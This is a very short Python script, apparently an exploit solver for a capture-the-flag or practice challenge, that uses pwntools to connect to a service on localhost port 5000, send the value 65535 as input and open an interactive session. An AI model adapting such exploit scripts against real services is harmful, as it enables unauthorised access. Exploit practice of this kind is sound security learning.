from pwn import *

r = remote('localhost', 5000)

r.sendline(str(0xffff).encode())

r.interactive()
